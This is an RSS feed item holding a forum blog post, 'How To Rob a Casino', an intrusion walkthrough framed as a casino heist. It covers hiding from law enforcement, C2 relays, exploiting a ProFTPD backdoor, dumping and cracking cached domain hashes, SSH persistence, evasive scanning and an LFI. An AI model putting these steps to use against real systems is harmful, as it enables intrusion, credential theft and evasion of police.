<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Red-Team - 0x00sec - The Home of the Hacker</title>
    <link>https://0x00sec.org/c/red-team/102</link>
    <description>Topics in the &#39;Red-Team&#39; category </description>
    
      <lastBuildDate>Thu, 16 May 2024 12:43:30 +0000</lastBuildDate>
      <atom:link href="https://0x00sec.org/c/red-team/102.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>How To Rob a Casino</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>Casinos, some view these places as something that corrupts the soul, leading individuals astray with the allure of easy money and instant gratification. Others see casinos as an escape from reality, seeking temporary relief from stress, boredom or dissatisfaction and for others it represents hope, offering the possibility of a better life through luck or skill.</p>
<p>But hackers?</p>
<p>An opportunity, a challenge, a game. Here we go again gentlemen Tropicana is back but this time besides the fact of saving your money, now it’s taking it as a gamble. This inspiration of a blog comes again from the Hacker Manifesto from Phineas Phisher [1] “bad guys”, the law, the “system” all trying to capture the “bad guy” who is stealing our money but is the bank here to protect us??[2].</p>
<p>But let’s forget about that, were here to Rob a casino, but ……. How do we do it? I’m no expert but I can recreate scenarios where it happened, replicate, and demonstrate some ideas on what tactics or techniques may or may not be used. Remember in the previous blog how we mentioned “Teach a man how to Phish” well it’s funny how the fish will be somewhat be involved [3].</p>
<p>Now I always try to demonstrate examples where people can have access and learn via Open Source tooling, in the last post on “How to Rob a Bank”[4] we worked with the Havoc[5] framework and amazing open source C2 that was built by a teenager trying to learn malware and that was working on it for 2 years before releasing it to us mortals. Please as mentioned previously don’t take this as a “Guide” a “How To” or a “Manual” because the infrastructures related to Casino’s, Banks, Treasury it’s quite different and here it’s just a simulation or is it?!?![6].</p>
<p>[1] <a href="https://unicornriot.ninja/wp-content/uploads/2019/11/hackback-announce-text.txt" rel="noopener nofollow ugc">https://unicornriot.ninja/wp-content/uploads/2019/11/hackback-announce-text.txt</a></p>
<p>[2] <a href="https://www.nytimes.com/2022/03/06/business/payments-fraud-zelle-banks.html" rel="noopener nofollow ugc">https://www.nytimes.com/2022/03/06/business/payments-fraud-zelle-banks.html</a></p>
<p>[3] <a href="https://www.washingtonpost.com/news/innovations/wp/2017/07/21/how-a-fish-tank-helped-hack-a-casino/" rel="noopener nofollow ugc">https://www.washingtonpost.com/news/innovations/wp/2017/07/21/how-a-fish-tank-helped-hack-a-casino/</a></p>
<p>[4] <a href="https://0x00sec.org/t/how-to-rob-a-bank/37022" class="inline-onebox">How To Rob a Bank</a></p>
<p>[5] <a href="https://github.com/HavocFramework/Havoc" class="inline-onebox" rel="noopener nofollow ugc">GitHub - HavocFramework/Havoc: The Havoc Framework.</a></p>
<p>[6] <a href="https://www.youtube.com/watch?v=t-Nz6us7DUA" rel="noopener nofollow ugc">Morpheus explains what is real</a></p>
<p>—-[ Preparation ]———————————————————————————————————–</p>
<p><em>“Give me six hours to chop down a tree and I will spend the first four sharpening the axe.”</em></p>
<p>Building the infrastructure is an important part of handling your security, OPSEC and post-exploitation techniques that you will be working on once inside the network.</p>
<p>Security, staying safe on the internet is of upmost importance if you are going to hack a Casino right? I mean if the feds are knocking at your door that means you did something wrong already, but we don’t need to worry as we have some small tips for a strong infrastructure.</p>
<p><em><strong>VPN</strong></em></p>
<p>VPNs have some popularity that has been known to hackers already[1][2][3] in a bad or good way about these products, so do whatever you want with this information, now that we have the “PARENT” of all proxies and VPNs, we can consider the Tor Network but it also comes with some controversial problems [4][5] uncle Sam is always peeping and they can be creative as well.</p>
<p>But with all these things going on what can we do???</p>
<p>Piggyback onto another Wi-Fi maybe build a cantenna [6] and grab that Wi-Fi from a mile away or buy some remote access into already hacked devices and do your deeds there? But remember IP Logs! I am aware of proxies, but I am not familiar with how good they can be.</p>
<p>But here are some VPN that claim they don’t keep logs; these are suggestions as one would say just consider them and do some due diligence with your research.</p>
<p><em><strong>Virtualization and Encryption</strong></em></p>
<p>Run everything from a virtual machine there are multiple services available VMWare, VirtualBox, QEMU, Hypervisor [7][8][9][10] I’ve delved into this topic previously but still a good reminder, some of these VMs come with the ability to encrypt the Disks but there is no harm in manually applying another layer inside the VM.</p>
<p>[1] <a href="https://www.zdnet.com/article/cyberstalker-thwarted-by-vpn-logs-gets-17-years-in-prison/" rel="noopener nofollow ugc">https://www.zdnet.com/article/cyberstalker-thwarted-by-vpn-logs-gets-17-years-in-prison/</a></p>
<p>[2] <a href="https://surfshark.com/blog/can-police-track-vpn" rel="noopener nofollow ugc">https://surfshark.com/blog/can-police-track-vpn</a></p>
<p>[3] <a href="https://www.theregister.com/2011/09/26/hidemyass_lulzsec_controversy/" class="inline-onebox" rel="noopener nofollow ugc">HideMyAss defends role in LulzSec hack arrest • The Register</a></p>
<p>[4] <a href="https://gizmodo.com/fbi-tor-ip-address-muhammed-momtaz-al-azhari-isis-1849975153" class="inline-onebox" rel="noopener nofollow ugc">How Did the FBI Get Muhammed Al-Azhari's IP Address From Tor?</a></p>
<p>[5] <a href="https://www.linkedin.com/pulse/fbi-can-track-locate-suspects-using-tor-still-secure-julian-wendt/" class="inline-onebox" rel="noopener nofollow ugc">FBI Can Track and Locate Suspects Using TOR. Is TOR Still Secure?</a></p>
<p>[6] <a href="https://www.instructables.com/DIY-Wifi-Extender-Cantenna-build-with-a-stand/" rel="noopener nofollow ugc">https://www.instructables.com/DIY-Wifi-Extender-Cantenna-build-with-a-stand/</a></p>
<p>[7] <a href="https://www.vmware.com/" rel="noopener nofollow ugc">https://www.vmware.com/</a></p>
<p>[8] <a href="https://www.virtualbox.org/" rel="noopener nofollow ugc">https://www.virtualbox.org/</a></p>
<p>[9] <a href="https://www.qemu.org/download/" class="inline-onebox" rel="noopener nofollow ugc">Download QEMU - QEMU</a></p>
<p>[10] <a href="https://medium.com/@liam.cafearo/setting-up-hyper-v-and-a-kali-linux-virtual-machine-1a76bb4fa0f" class="inline-onebox" rel="noopener nofollow ugc">Setting up Hyper-V and a Kali Linux Virtual Machine | by Liam Cafearo | Medium</a></p>
<p>—-[ Infrastructure ]————————————————————————————————————-</p>
<p>You managed to hide your tracks and think that you are in the clear that Big Brother is no longer watching your tracks, good!! But you need to build your infrastructure now, our server, redirectors and strong OPSEC so they don’t find you. Here are some “Tips and Tricks” to be careful.</p>
<p>The C2 Server</p>
<p>In this example will be using the Empire [1] C2 Framework, I know in the previous one I was working with Havoc, and as much of a fan I am I want to demonstrate that there is no “right” way of thinking don’t learn about the tool, learn about the technique that the tool takes advantage of. Maybe mimikatz for example grabs credentials from the LSASS process but is that it?! Is that the only place where there are passwords? Not really, Cookies, Files, Browsers they all contain that loot we are looking for, so that’s why I am working in using another C2 for this article, blog, whatever it’s considered to be.</p>
<p><em>“To understand the technique.”</em></p>
<p>I don’t want to get much into detail for installing and running empire but if you follow the wiki setup should be simple to install using an officially supported OS but in my case, I will be using a Docker[2] as Empire has no official support for BlackArchLinux, Dockers are a great way for temporary use, they can be created and destroyed in a breeze, when setting up your C2 we have to change it up a little, Ports, Headers, Obfuscation, the default settings are great but they are also well known, leave a new fingerprint every time you work these tools have been updated and modernized to use the latest techniques leaving stuff with the default settings nowadays is a great way to get you caught.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-153.png?w=624" alt="" width="624" height="458" role="presentation"></p>
<p>Now we can’t just have our server facing the internet in default values you’ll get caught!![3] first will need some similar domains to the target as we are trying to blend in with our network traffic, to make sure it doesn’t look suspicious when we are moving inside the network or if we ever do phishing we will try to look the least suspicious as possible, C2s allow us to use something called Malleable[4] profiles to blend our traffic when our agent, beacon, demon calls back to us the traffic it uses is similar to common malicious connections so we have to make it look legitimate not simple connections where our commands and output can be easy to read from, a step into blending our traffic is finding legitimate expired domains[5] that we can use on our HTTP traffic.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-154.png?w=423" alt="" width="423" height="231" role="presentation"></p>
<p>These examples were available to purchase maybe previous owners just didn’t have the need to continue with the domain. These domains are a good approach as Domain Categorization where AV/EDR or network product categorizes [6] a Domain to understand what’s it doing and what’s it meant for, so this is already done for you, but the process of aging still has to be looked on since registrations are shown as recent they were even if they are expired domains.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-155.png?w=537" alt="" width="537" height="141" role="presentation"></p>
<p>Now that the domains are set for mixing our net traffic will need some relays, these work in the benefit of pointing our implants away from our server, if our server gets burned, we need to build it again and we don’t want to start all over again. Setting up relays is quite simple utilizing socat [7] with the following command:</p>
<pre><code class="lang-auto">socat -v TCP-LISTEN:4444,fork TCP:C2SERVER:4444
</code></pre>
<p>We listen on Port 4444 and relay all traffic to our server on the same port. We will verify this by setting up Wireshark to ensure our payload calls the relay instead of the real server. This way, if IP blocking is in place, our relay server will be flagged instead of our C2 server, and setting up a new relay is way faster than a new server.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-156.png?w=624" alt="" width="624" height="338" role="presentation"></p>
<p>This is a simple redirector. There are legitimate services that can relay our connections and be more OPSEC about it [8][9][10]?? It’s just about being creative in this example all I am doing is just forwarding the TCP connections to my server.</p>
<p>You can notice on the screenshot that Wireshark only sees the IP Relay as the Destination but can’t see beyond that, so the server stays safe from prying eyes. Let’s add more layers of evasion into our infrastructure, another service for applying more security is Apache [11], Apache contains methods to Block IPs, allow only certain requests that contain certain values to have access onto our C2 Server.</p>
<p>—-[ Blocking IPs]—————————————————————————————————————-</p>
<p>Pretty simple locate your configuration file in the  and place the IP or IP Range that you’d like to block.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-157.png?w=247" alt="" width="247" height="104" role="presentation"></p>
<p>If I try to access the resource I get denied</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-158.png?w=624" alt="" width="624" height="143" role="presentation"></p>
<p>—-[ Custom Headers]———————————————————————————————————–</p>
<p>Now let’s remove it and try with specific values, let’s say Apache will only grant you access if there’s a specific Header in your request and if it doesn’t exist then it won’t allow you.</p>
<p>We will need to enable some modules that have been commented out:</p>
<p>LoadModule rewrite_module modules/mod_rewrite.so</p>
<p>LoadModule headers_module modules/mod_headers.so</p>
<p>From here will edit the  tag again placing the following values</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-159.png?w=486" alt="" width="486" height="144" role="presentation"></p>
<p>Requesting again to access the server with the specified Header will be the only way to gain access.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-160.png?w=624" alt="" width="624" height="380" role="presentation"></p>
<p>Apache has numerous options and security layers that can be added to their configuration play around and check ideas on what can you do to strengthen your infrastructure.</p>
<p>[1] <a href="https://github.com/EmpireProject/Empire" class="inline-onebox" rel="noopener nofollow ugc">GitHub - EmpireProject/Empire: Empire is a PowerShell and Python post-exploitation agent.</a></p>
<p>[2] <a href="https://bc-security.gitbook.io/empire-wiki/quickstart/installation#docker" class="inline-onebox" rel="noopener nofollow ugc">Installation | Empire Wiki</a></p>
<p>[3] <a href="https://twitter.com/MichalKoczwara/status/1657090134129401866" rel="noopener nofollow ugc">https://twitter.com/MichalKoczwara/status/1657090134129401866</a></p>
<p>[4] <a href="https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/" class="inline-onebox" rel="noopener nofollow ugc">How the Malleable C2 Profile Makes Cobalt Strike Difficult to Detect</a></p>
<p>[5] <a href="https://www.expireddomains.net/" rel="noopener nofollow ugc">https://www.expireddomains.net/</a></p>
<p>[6] <a href="https://urlfiltering.paloaltonetworks.com/query/" class="inline-onebox" rel="noopener nofollow ugc">Palo Alto Networks URL filtering - Test A Site</a></p>
<p>[7] <a href="https://linux.die.net/man/1/socat" rel="noopener nofollow ugc">https://linux.die.net/man/1/socat</a></p>
<p>[8] <a href="https://0xdarkvortex.dev/c2-infra-on-azure/" class="inline-onebox" rel="noopener nofollow ugc">A Thousand Sails, One Harbor - C2 Infra on Azure</a></p>
<p>[9] <a href="https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/" rel="noopener nofollow ugc">https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/</a></p>
<p>[10] <a href="https://medium.com/trainingdock/http-redirects-with-lambda-c20cf7934060" class="inline-onebox" rel="noopener nofollow ugc">HTTP Redirects with Lambda. In this recipe, we cover: | by fkaz | TrainingDock | Medium</a></p>
<p>[11] <a href="https://httpd.apache.org/" rel="noopener nofollow ugc">https://httpd.apache.org/</a></p>
<p>—-[ Recon ]———————————————————————————————————————–</p>
<p>Now recon has been the golden step for Red Teamers, Penetration Testers, APTs, Doctors, Scientists, you name it, this step is crucial for moving forward it helps you decide on what needs to be done next, the informed decisions you can take once you are on the network, maybe you don’t need to Privilege Escalate if your current users have the required permissions maybe Initial Access is our target but the information gathered on the version of Office that they are working with 2013, 2016, o365??. These files can hold valueable information that we can utilize for our External or Internal Enumeration, they contain tons of valueable data some of that data is called Metadata [1] looking at a file grabbed from the Casino’s website for a Job Posting demonstrates the user who created this file below.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-161.png?w=561" alt="" width="561" height="189" role="presentation"></p>
<p>This information comes in handy when we are weaponizing our payloads to send to our target this method can be used if we were applying a password spraying technique or targeting specific users on the enterprise to avoid the issues of Spam make more rational and targeted phishing campaigns, as mentioned in the previous post “How to Rob a Bank, but in this scenario there is no need for Phishing since we found an IOT[2] (Internet Of Things) connected to the Internet, here will look at some resources to find some data that we can utilize when Enumerating externally.</p>
<p>What I like to do with this info now that I have a full name, sometimes you will get an internal username instead of a name like this one, but if that is not the case utilizing namemash.py [3] is a great method to build usernames to find the naming convention used internally</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-162.png?w=624" alt="" width="624" height="262" role="presentation"></p>
<p>We can avoid scanning ports and services by checking out other places that did this for us. For example, Shodan [4] a popular “HACKER” search engine, and well known for scanning the internet for open ports on IOTs, Shodan has an incredible API that we can utilize in the Command-Line Interface here is an example of finding information about hosts, such as IP, HOSTNAME, PORT AND SERVCE</p>
<pre><code class="lang-auto">shodan search --fields ip_str,port,org,hostnames "Golden FTP"
</code></pre>
<p>The results of this scan are quite impressive but hidden as I don’t want to show vulnerable or potential targets but in seen below, I’ve targeted port 21 to be specific where I know the FTP protocol and services are running a potential initial access vector since it can give me RCE or even anonymous file access.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-163.png?w=624" alt="" width="624" height="387" role="presentation"></p>
<p>Now that we have located potential targets, we can now request a scan on the target we are interested in and gather a more detailed view on the information we are looking at.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-164.png?w=546" alt="" width="546" height="252" role="presentation"></p>
<p>I do recommend verifying the Data manually if you can, since Shodan scans are just snapshots of when Shodan did the scan itself, once you proceed verifying this info yourself then it might yield you different results.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-165.png?w=624" alt="" width="624" height="174" role="presentation"></p>
<p>Now I’ll be using some open source tooling built in the python language, I do recommend when working with Python tools to create a virtual environment this way you don’t break none of the other dependencies on your system and it’s a cleaner way to have an environment you can remove at any time, now I did not use this in the Shodan example because the tool was already pre-installed but a recommendation just in case you need to use something from GitHub</p>
<pre><code class="lang-auto">python3 -m venv python-environment

To access or start your virtual environment you would need the source command.

source python-environment/bin/activate
</code></pre>
<p>Now with that you will notice a new location set on your terminal path along with the username and hostname when this is all set and done, installing old or new python tools has been simplified with the safety of not forcing or breaking packages form your OS.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-166.png?w=579" alt="" width="579" height="63" role="presentation"></p>
<p>I can run and install Spadefoot[5] without any issues inside the environment it would open a web page with the interface and options to start scanning our target be it a webpage or IP Address it’s a powerful tool for reconnaissance with options ranging in the passive to active scanning it will dive as deep as you allow it to for finding any valueable data related to our target the scanning is time consuming so research and look for other places while this is done and come back to at a later time</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-167.png?w=624" alt="" width="624" height="227" role="presentation"></p>
<p>Placing your tools in a virtual environment can be quite powerful and helpful to keep everything neatly organized and functional without the need to break your OS with all the extra unnecessary packages that one tool might require. I advise looking at the IoT Methodology [6] to have an idea on how to approach attacking stuff like this.</p>
<p>[1] <a href="https://en.wikipedia.org/wiki/Metadata#:~:text=Metadata%20means%20%22data%20about%20data,working%20with%20specific%20data%20easier" class="inline-onebox" rel="noopener nofollow ugc">Metadata - Wikipedia</a>.</p>
<p>[2] <a href="https://www.oracle.com/internet-of-things/what-is-iot/" class="inline-onebox" rel="noopener nofollow ugc">What Is the Internet of Things (IoT)?</a></p>
<p>[3] <a href="https://raw.githubusercontent.com/krlsio/python/main/namemash.py" rel="noopener nofollow ugc">https://raw.githubusercontent.com/krlsio/python/main/namemash.py</a></p>
<p>[4] <a href="https://www.shodan.io/" rel="noopener nofollow ugc">https://www.shodan.io/</a></p>
<p>[5] <a href="https://github.com/smicallef/spiderfoot" class="inline-onebox" rel="noopener nofollow ugc">GitHub - smicallef/spiderfoot: SpiderFoot automates OSINT for threat intelligence and mapping your attack surface.</a></p>
<p>[6] <a href="https://github.com/inguardians/IoTA" class="inline-onebox" rel="noopener nofollow ugc">GitHub - inguardians/IoTA: The Internet of Things Attack (IoTA) Methodology</a></p>
<p>—-[ Initial Access ]—————————————————————————————————————</p>
<p>In 2017, the most creative casino [1] breach occurred in the US. Rather than employing sophisticated techniques like 0-day exploits, phishing, or polymorphic self-encrypting malware, the attackers took a simpler route: they accessed a fish tank thermometer. This Linux-based thermometer, connected to the internet is part of the Internet of Things (IoT), it was linked to the same network hosting the casino’s internal infrastructure. IOTs are a great for deployment and have its conveniences for the user but they also have problems[2] IOTs to my experience are still a vast pool of the unknown but amazing individuals have jumped and started looking into these potentially broken devices, now for this example we won’t need to go that far since Metasploit[3] has the sufficient functions for us to gain Initial Access starting with a port scan will locate services with potential vulnerabilities that can allow use to gain access.</p>
<p>There are multiple tools that we can utilize to achieve our goals, some of them are actually combined with well-known ones such as rustscan[4] or custom ones written in your favorite language but here I will be using some methods just for verification and demonstration that sometimes all these tools won’t be available and creativity is what would help here, our first method is using the popular port scanner nmap[5] which needs no introduction as it’s the most popular well known pentester/redteam/blueteam tool known to man now take a look at the output below:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-168.png?w=624" alt="" width="624" height="343" role="presentation"></p>
<p>Notice the detail of the scan, and the methods used such as the -sC (Safe Scripts) and -sV (Version) this information has been fingerprinted to be running on a OS: Ubuntu type but I want to show you this because we can’t just trust 1 tool or 1 method doesn’t matter how popular or useful it can be, always verify the information, QUESTION EVERYTHING[6] now another method I simply used the ncat tool to connect to a port, do some banner grabbing and confirm the port is actually open and reachable.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-169.png?w=624" alt="" width="624" height="270" role="presentation"></p>
<p>I’ve confirmed that the ports are open, and I can interact with them so I can proceed with more enumeration and proceed with some vulnerability scanning and check the possibilities of exploits available where I can gain my first access.</p>
<p>Now a common methodology is to start looking for low hanging fruit, or the quick wins for these methods, will start in a simple order from top to bottom, normally this is not the approach taken with more professional pentesters as they can tell by experience, the ports that might give them those quick wins. In this example it’s port 21 to locate potential exploits with an offline tool named searchsploit [7] a great terminal alternative to exploitdb which allows you to quickly access workable exploits and documentation offline.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-170.png?w=624" alt="" width="624" height="89" role="presentation"></p>
<p>I investigated this exploit by using the X flag. We can get more details about it if it’s available the info is usually inside the description of the exploit or sometimes, they contain a txt file that gives a more detailed description about the exploit.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-171.png?w=621" alt="" width="621" height="202" role="presentation"></p>
<p>So there seems to be a backdoor on this version of ProFTPD, if we read the module from Metasploit we can find out the backdoor command sent to ProFTPD to gain a root shell.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-172.png?w=354" alt="" width="354" height="42" role="presentation"></p>
<p>Great now I’ve gained Initial Access onto the Casino’s Internal Network</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-173.png?w=624" alt="" width="624" height="99" role="presentation"></p>
<p>Now that I finally have Initial Access onto the network it’s time to get into more hacking, getting around the systems, reach domain admin, dump some credz, evade some defenses, some tricks to reach our goal. Since enumeration is always key to decide what’s our next step onto the network let’s work with Ubuntu here for some AD (Active Directory) enumeration, it’s a little tricky since most tools are mostly written for Windows environments, some people are unaware that Ubuntu can be added [8] to the AD as well! But before continuing let’s upgrade [9] our shell to have a more stable terminal interaction.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-174.png?w=440" alt="" width="440" height="126" role="presentation"></p>
<p>Perfect, moving forward should be a breeze, let’s check where we are and grab some info on the domain, locate some users, find any other computers on the AD a bunch to work on to reach our goal using the realm tool which is a tool needed to join an AD network with Ubuntu.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-175.png?w=358" alt="" width="358" height="352" role="presentation"></p>
<p>Let’s check for any local users finding these can also give us an idea on how the workflow is worked on, local accounts are a common thing for when a workstation is being set up for the first time , back in my IT days we’d have 1 local master account to add the AD infrastructure and necessities but the local master account was never removed or even changed to give it less permissions!!!. But oh well what can you do ¯_(ツ)_/¯</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-176.png?w=434" alt="" width="434" height="102" role="presentation"></p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-177.png?w=87" alt="" width="87" height="26" role="presentation"></p>
<p>Only one local user, now the interesting part is to enumerate the Active Directory now, but since we don’t hold credentials for our a domain user and some methods and tools require credentials I’ll need to locate a potential user first by using the “w” command we can see if there are any active users on the machine that may give us an idea of the users that are available, the time they logged in, IDLE time and much more information this can also point out the naming convention of the internal AD users.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-178.png?w=624" alt="" width="624" height="84" role="presentation"></p>
<p>Locating our first AD user with this helps us move forward now we can probably brute force usernames, locate more users, workstations and network connections to make sure that we can move laterally and if there’s an option to get around, but we need credentials since I don’t have much experience in locating hashes for the AD user in Ubuntu I had to do some research for this, in my scenario I found the hashes here:</p>
<pre><code class="lang-auto">grep -a "cachedPassword" /var/lib/sss/db/*
</code></pre>
<p>Using these hashes with hashcat we get a chance to crack these hashcat is a powerful tool for cracking passwords hashes with multiple options and features to help us achieve our goal of gaining cleartext credentials from a hash it’s simply a great tool to have in your arsenal, moving forward I used a command to lcoate me these hashes.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-179.png?w=437" alt="" width="437" height="22" role="presentation"></p>
<p>Once located you can pass the hash onto hashcat and attempt to crack it, the password here was successfully cracked since it was a combination of Season + Year which is a common combination of weak passwords. Don’t be afraid of trying simple and well known credentials, they are still really common. I like to use rules as well, and you should be using rules since they mutate the words to find potential passwords such as Password → P@$$w0rd.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-180.png?w=624" alt="" width="624" height="227" role="presentation"></p>
<p>To proceed in enumerating the AD we need some information about where the DC is located, you can run an nmap scan internally and try to find it by checking out your output, but this could be quite noisy, I used the adcli[10] command-line tool to get this information as it’s another tool that comes installed in Linux machines that were joined in a domain:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-181.png?w=624" alt="" width="624" height="188" role="presentation"></p>
<p>Now the AD tools commonly use have been built for Windows environments but there are some great people out there that have built versions of these tools capable to run on Linux using python[11][12]but there are also built in tools in Linux that we can utilize such as LDAPSEARCH[13] the queries can be quite tricky and complicated to learn, so I do recommend testing these commands before running them to avoid crashing your shell and having a cheat sheet when you need to enumerate certain information on the domain</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-182.png?w=624" alt="" width="624" height="420" role="presentation"></p>
<p>On the screenshot above I enumerated the Domain Users seeing if I can find anything interesting such as finding passwords in the “Description Section” or users that belong to interesting groups, we can also look for SPN values that may allow us to use the Kerberoasting[14] attack and gain another users cleartext password but only experience will benefit us if we know some of the AD scenarios and techniques, if we are brand new to this only research will help us move forward. In the following screenshot I enumerated the available workstations</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-183.png?w=624" alt="" width="624" height="445" role="presentation"></p>
<p>In the above screenshot I am currently in the BCK-WKN1 workstation my goal is to move in this direction</p>
<pre><code class="lang-auto">BCK-WKN1 -&gt; BCK-WKN2 -&gt; GD-WKN1 -&gt; IT-WKN1
</code></pre>
<p>Now even though this output is great and all running tools on the host is kind of a “No, no” we may want to run a proxy onto the targeted workstation and run our custom tools with no issues of being detected in terms of local security products, since our tools are running in our controlled environment.</p>
<p>Before proceeding I should place persistence in case that my connection dies, the server reboots or any shenanigans since I am in a Linux machine my most comfortable course of action is to work with SSH by editing the configuration file I can allow it to use a private key for access instead of a password which I still don’t know, so on my attacker machine I should create a key:</p>
<pre><code class="lang-auto">ssh-keygen -t rsa -b 4096
</code></pre>
<p>When my key has been created, I can copy the id_rsa.pub key and copy its contents and place them in the remote workstation in a file named authorized_keys with that I can login using my private key that I’ve created on my attacking machine and login with a more stable terminal.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-184.png?w=450" alt="" width="450" height="153" role="presentation"></p>
<p>And now I have a more stable and fully functional terminal, I’ve learned to work with this method if you’ve played HackTheBox in the past you will find familiar techniques or resources that I’ll point to so you can try them yourself, I try to live in Open Source as possible to show you that not everything is a complicated tool or technique.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-185.png?w=624" alt="" width="624" height="321" role="presentation"></p>
<p>Now with persistence in place via SSH setting up a Dynamic Port Forwarding using the -D 9999 is my next step so I can pass my tools via proxy and gather information as I would from the remote host but this time not worrying about dependencies or other issues since they are pre-installed or fully functional from my host with pywerview [15] I gather Domain User information.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-186.png?w=624" alt="" width="624" height="89" role="presentation"></p>
<p>I saved the output to JSON and beautified it using the jq [16] tool</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-187.png?w=624" alt="" width="530" height="499" role="presentation"></p>
<p>Searching for Domain Computers with pywerview should be quite simple and now I can focus on filtering out information I would like to gather, the project is quite interesting in the methods it uses for the information it queries, by utilizing LDAP to query this I would consider it a slightly more OPSEC friendly method to gather the information as other tools that use PowerShell or C# tend to use well known protocols and methods such as Windows APIs that’s why it’s a great skill to know you’re way around different Operating Systems</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-188.png?w=525" alt="" width="525" height="422" role="presentation"></p>
<p>For locating services and open ports running on computers in the internal network I will use the nmap port scanner to find potential attacks for moving laterally but I also want to consider the fact that I am being watched, nmap has great tools for spoofing, evasion and such that can help me scan these ports more quietly and still effective I targeted specific ports that I guessed should be opened on the network, here is the command I used:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-189.png?w=624" alt="" width="624" height="181" role="presentation"></p>
<p>A brief explanation on the commands I used below, I didn’t use all the options but do play around and experiment:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-190.png?w=624" alt="" width="624" height="235" role="presentation"></p>
<pre><code class="lang-auto">-------------------------[Nmap]----------------------------------------------------

-f: The -f option causes the requested scan (including host discovery scans) to use tiny, fragmented IP packets. The idea is to split up the TCP header over several packets to make it harder for packet filters, intrusion detection systems, and other annoyances to detect what you are doing.

--script-args http.userganet: This option helps me change the default value of the header used for nmap when it's scanning I can pass by as an iPhone, Windows, Printer, Android any device I want to blend in with the network traffic instead of just sending a big red flag that says "Nmap Engine"

--randomize-hosts: I don't want to scan in order since you can tell that something is going on, on the network because a scan is being done from top to bottom but if you can make it look random you have a better chance to blend in

-D: Decoys are sent to the network to try and spoof the source of where the real port scanning is coming from

Do play around there are other great options such as slow scanning, changing the fragmented packet sizes use a source port to show that the port is coming from a legitimate source like port 80, experiment.

-------------------------[Nmap]----------------------------------------------------
</code></pre>
<p>I’ve located my next move which is BCK-WKN2 it’s time to restart my enumeration and follow the process again, looking for low-hanging fruits, vulnerability scanning, exploitation and so on:</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-191.png?w=624" alt="" width="624" height="187" role="presentation"></p>
<p>Taking a quick look at port 80 since it has the most potential in terms of exploitation as internal web applications tend to be vulnerable to some serious exploits since they don’t have the development time for focusing on security, companies tend to ignore these facts just because “they aren’t facing the internet” but hey it’s good for us, a web application scanner I like to use as of lately is nuclei[17] a fast vulnerability scanner designed to probe modern applications, infrastructure, cloud platforms, and networks, aiding in the identification and mitigation of exploitable vulnerabilities, powerful tool that can be customized and add even more custom attacks, the templates are based on YAML so some work to get used to. The scan shown below demonstrates an LFI[18] vulnerability</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-192.png?w=624" alt="" width="624" height="196" role="presentation"></p>
<p>[! WARNING]</p>
<p>Do be careful with using scanners on internal networks the default settings are usually running at high speeds sending multiple requests per second, if not careful you can crash the application and give yourself away.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-193.png?w=624" alt="" width="624" height="155" role="presentation"></p>
<p>Let’s look at the website and test this vulnerability manually we can use the web browser or do a simple curl command with the example given by nuclei.</p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-194.png?w=624" alt="" width="624" height="293" role="presentation"></p>
<p><img src="https://mydmcxblue.files.wordpress.com/2024/05/image-195.png?w=624" alt="" width="624" height="196" role="presentation"></p>
<p>Seen above, notice the output from curl we can read files on the remote workstation, this gives us some potential stuff to look at and gain some access to the remote workstation.</p>
